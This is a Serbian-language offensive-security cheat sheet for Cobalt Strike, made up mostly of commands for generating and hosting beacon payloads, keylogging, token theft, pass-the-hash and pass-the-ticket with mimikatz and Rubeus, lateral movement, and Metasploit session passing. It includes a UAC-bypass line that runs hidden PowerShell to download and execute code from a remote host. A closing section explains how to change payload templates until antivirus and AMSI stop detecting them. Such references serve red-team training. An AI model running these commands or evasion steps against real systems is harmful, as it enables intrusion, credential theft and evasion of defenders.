# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` zatim možete odabrati gde da slušate, koju vrstu beacon-a da koristite (http, dns, smb...) i još mnogo toga.

### Peer2Peer Listeners

Beaconi ovih slušalaca ne moraju direktno da komuniciraju sa C2, mogu da komuniciraju preko drugih beacon-a.

`Cobalt Strike -> Listeners -> Add/Edit` zatim treba da odaberete TCP ili SMB beacone

* **TCP beacon će postaviti slušalac na odabranom portu**. Da biste se povezali na TCP beacon, koristite komandu `connect <ip> <port>` iz drugog beacon-a
* **smb beacon će slušati na pipename-u sa odabranim imenom**. Da biste se povezali na SMB beacon, morate koristiti komandu `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** za HTA datoteke
* **`MS Office Macro`** za kancelarijski dokument sa makroom
* **`Windows Executable`** za .exe, .dll ili servis .exe
* **`Windows Executable (S)`** za **stageless** .exe, .dll ili servis .exe (bolje stageless nego staged, manje IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Ovo će generisati skriptu/izvršni fajl za preuzimanje beacon-a iz cobalt strike u formatima kao što su: bitsadmin, exe, powershell i python

#### Host Payloads

Ako već imate datoteku koju želite da hostujete na web serveru, samo idite na `Attacks -> Web Drive-by -> Host File` i odaberite datoteku za hostovanje i konfiguraciju web servera.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
execute-assembly </path/to/executable.exe>

# Screenshots
printscreen    # Uzmi jedan screenshot putem PrintScr metode
screenshot     # Uzmi jedan screenshot
screenwatch    # Uzmi periodične screenshot-ove desktop-a
## Idite na View -> Screenshots da ih vidite

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes da vidite pritisnute tastere

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Umetnite portscan akciju unutar drugog procesa
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell <just write powershell cmd here>

# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Kreirajte token za impersonaciju korisnika u mreži
ls \\computer_name\c$ # Pokušajte da koristite generisani token za pristup C$ na računaru
rev2self # Prestanite da koristite token generisan sa make_token
## Korišćenje make_token generiše događaj 4624: Račun je uspešno prijavljen. Ovaj događaj je veoma čest u Windows domenima, ali se može suziti filtriranjem po tipu prijavljivanja. Kao što je pomenuto, koristi LOGON32_LOGON_NEW_CREDENTIALS koji je tip 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Kao make_token, ali krade token iz procesa
steal_token [pid] # Takođe, ovo je korisno za mrežne akcije, ne lokalne akcije
## Iz API dokumentacije znamo da ovaj tip prijavljivanja "omogućava pozivaocu da klonira svoj trenutni token". Zato Beacon izlaz kaže Impersonated <current_username> - impersonuje naš vlastiti klonirani token.
ls \\computer_name\c$ # Pokušajte da koristite generisani token za pristup C$ na računaru
rev2self # Prestanite da koristite token iz steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Uradite to iz direktorijuma sa pristupom za čitanje kao: cd C:\
## Kao make_token, ovo će generisati Windows događaj 4624: Račun je uspešno prijavljen, ali sa tipom prijavljivanja 2 (LOGON32_LOGON_INTERACTIVE). Detaljno će prikazati korisnika koji poziva (TargetUserName) i impersoniranog korisnika (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## Iz OpSec tačke gledišta: Ne vršite cross-platform injekciju osim ako zaista ne morate (npr. x86 -> x64 ili x64 -> x86).

## Pass the hash
## Ovaj proces modifikacije zahteva patch-ovanje LSASS memorije što je visoko rizična akcija, zahteva lokalne administratorske privilegije i nije uvek izvodljivo ako je omogućena Protected Process Light (PPL).
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Bez /run, mimikatz pokreće cmd.exe, ako se pokrećete kao korisnik sa Desktop-om, on će videti shell (ako se pokrećete kao SYSTEM, možete nastaviti)
steal_token <pid> #Kradite token iz procesa koji je kreirao mimikatz

## Pass the ticket
## Zatražite tiket
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Kreirajte novu sesiju prijavljivanja za korišćenje sa novim tiketom (da ne prepišete kompromitovani)
make_token <domain>\<username> DummyPass
## Napišite tiket na mašini napadača iz powershell sesije & učitajte ga
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generišite novi proces sa tiketom
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Ukradite token iz tog procesa
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump interesting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Kreirajte novu sesiju prijavljivanja, zabeležite luid i processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Umetnite tiket u generisanu sesiju prijavljivanja
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Na kraju, ukradite token iz tog novog procesa
steal_token <pid>

# Lateral Movement
## Ako je token kreiran, biće korišćen
jump [method] [target] [listener]
## Metode:
## psexec                    x86   Koristite servis za pokretanje Service EXE artefakta
## psexec64                  x64   Koristite servis za pokretanje Service EXE artefakta
## psexec_psh                x86   Koristite servis za pokretanje PowerShell one-liner-a
## winrm                     x86   Pokrenite PowerShell skriptu putem WinRM
## winrm64                   x64   Pokrenite PowerShell skriptu putem WinRM

remote-exec [method] [target] [command]
## Metode:
<strong>## psexec                          Daljinsko izvršavanje putem Service Control Manager
</strong>## winrm                           Daljinsko izvršavanje putem WinRM (PowerShell)
## wmi                             Daljinsko izvršavanje putem WMI

## Da biste izvršili beacon sa wmi (nije u jump komandi) samo otpremite beacon i izvršite ga
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## Na metaploit hostu
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Na cobalt: Listeners > Add i postavite Payload na Foreign HTTP. Postavite Host na 10.10.5.120, Port na 8080 i kliknite na Save.
beacon> spawn metasploit
## Možete samo pokrenuti x86 Meterpreter sesije sa stranim slušateljem.

# Pass session to Metasploit - Through shellcode injection
## Na metasploit hostu
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Pokrenite msfvenom i pripremite multi/handler slušalac

## Kopirajte bin datoteku na cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Injektujte metasploit shellcode u x64 proces

# Pass metasploit session to cobalt strike
## Generišite stageless Beacon shellcode, idite na Attacks > Packages > Windows Executable (S), odaberite željeni slušalac, odaberite Raw kao tip izlaza i odaberite Use x64 payload.
## Koristite post/windows/manage/shellcode_inject u metasplotu da injektujete generisani cobalt strike shellcode


# Pivoting
## Otvorite socks proxy u teamserveru
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Avoiding AVs

### Artifact Kit

Obično u `/opt/cobaltstrike/artifact-kit` možete pronaći kod i prethodno kompajlirane šablone (u `/src-common`) payload-a koje cobalt strike koristi za generisanje binarnih beacon-a.

Korišćenjem [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) sa generisanim backdoor-om (ili samo sa kompajliranim šablonom) možete otkriti šta uzrokuje aktivaciju defanzivnog sistema. Obično je to string. Stoga možete samo modifikovati kod koji generiše backdoor tako da taj string ne pojavi u konačnom binarnom fajlu.

Nakon modifikacije koda, samo pokrenite `./build.sh` iz istog direktorijuma i kopirajte `dist-pipe/` folder u Windows klijent u `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Ne zaboravite da učitate agresivni skript `dist-pipe\artifact.cna` kako biste naznačili Cobalt Strike-u da koristi resurse sa diska koje želimo, a ne one koji su učitani.

### Resource Kit

Folder ResourceKit sadrži šablone za Cobalt Strike-ove skriptne payload-e uključujući PowerShell, VBA i HTA.

Korišćenjem [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) sa šablonima možete pronaći šta defender (AMSI u ovom slučaju) ne voli i modifikovati to:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modifikovanjem otkrivenih linija može se generisati šablon koji neće biti uhvaćen.

Ne zaboravite da učitate agresivni skript `ResourceKit\resources.cna` kako biste naznačili Cobalt Strike-u da koristi resurse sa diska koje želimo, a ne one koji su učitani.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

